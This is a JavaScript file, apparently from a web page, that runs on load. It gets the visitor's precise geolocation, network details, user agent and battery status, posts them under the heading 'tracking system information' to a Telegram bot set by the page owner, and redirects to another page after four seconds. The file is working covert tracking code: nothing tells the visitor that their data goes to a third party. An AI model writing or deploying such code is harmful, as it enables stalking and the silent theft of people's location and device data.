function toDMS(decimal, isLat) {
    const absolute = Math.abs(decimal);
    const degrees = Math.floor(absolute);
    const minutesNotTruncated = (absolute - degrees) * 60;
    const minutes = Math.floor(minutesNotTruncated);
    const seconds = ((minutesNotTruncated - minutes) * 60).toFixed(1);
    const direction = isLat ? (decimal >= 0 ? "N" : "S") : (decimal >= 0 ? "E" : "W");
    return `${degrees}°${minutes}'${seconds}"${direction}`;
}

function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    if (!connection) {
        return {
            type: "Unavailable",
            effectiveType: "Unavailable",
            downlink: null,
            rtt: null,
            description: "Network Info tidak didukung"
        };
    }

    const type = connection.type || "unknown";                 
    const effectiveType = connection.effectiveType || "unknown"; 
    const downlink = connection.downlink || null;              
    const rtt = connection.rtt || null;                        

    let description = "";
    if (type === "wifi") {
        description = "WiFi";
    } else if (type === "cellular") {
        description = `Cellular (${effectiveType.toUpperCase()})`;
    } else {
        description = `${type} (${effectiveType})`;
    }

    if (downlink) description += ` • ~${downlink} Mbps`;
    if (rtt) description += ` • RTT ${rtt}ms`;

    return { type, effectiveType, downlink, rtt, description };
}

async function kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus) {
    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const dms = `${toDMS(latitude, true)} ${toDMS(longitude, false)}`;

    const pesan = `⚠︎ tracking system information

Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${accuracy} meter

Network Type: ${networkInfo.type}
Effective Type: ${networkInfo.effectiveType}
Detail: ${networkInfo.description}
${networkInfo.downlink ? `Downlink: ~${networkInfo.downlink} Mbps` : ""}
${networkInfo.rtt ? `RTT: ${networkInfo.rtt} ms` : ""}

Device Info: ${deviceInfo}
Battery Level: ${batteryStatus.level}%
Charging: ${batteryStatus.charging ? "Yes" : "No"}

Maps: ${mapsUrl}

[${dms}](${mapsUrl})`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: pesan,
                parse_mode: "Markdown",
                disable_web_page_preview: false
            })
        });
        console.log("Lokasi dan informasi terkirim ke Telegram");
    } catch (err) {
        console.error("Gagal kirim informasi:", err);
    }
}

function berhasilLokasi(posisi) {
    const latitude  = posisi.coords.latitude;
    const longitude = posisi.coords.longitude;
    const accuracy  = posisi.coords.accuracy;

    const networkInfo = getNetworkInfo();
    const deviceInfo = navigator.userAgent;

    let batteryStatus = { level: "Unavailable", charging: false };

    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            batteryStatus = {
                level: Math.floor(battery.level * 100),
                charging: battery.charging
            };
            kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
        }).catch(() => {
            kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
        });
    } else {
        kirimPesanLokasi(latitude, longitude, accuracy, networkInfo, deviceInfo, batteryStatus);
    }

    console.log("Latitude :", latitude);
    console.log("Longitude:", longitude);
    console.log("Accuracy :", accuracy, "meter");
    console.log("Network  :", networkInfo);
    console.log("Device Info:", deviceInfo);
}

function gagalLokasi(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            console.error("Izin lokasi ditolak.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.error("Lokasi tidak tersedia.");
            break;
        case error.TIMEOUT:
            console.error("Timeout lokasi.");
            break;
        default:
            console.error("Error lokasi:", error.message);
    }
}

if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(berhasilLokasi, gagalLokasi, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });
} else {
    console.error("Browser tidak mendukung Geolocation.");
}

let isRedirecting = false;

function goToLab() {
    if (isRedirecting) return;
    isRedirecting = true;
    document.body.classList.add('fade-out');
    setTimeout(() => {
        window.location.href = 'index1.html';
    }, 350);
}

setTimeout(() => {
    goToLab();
}, 4000);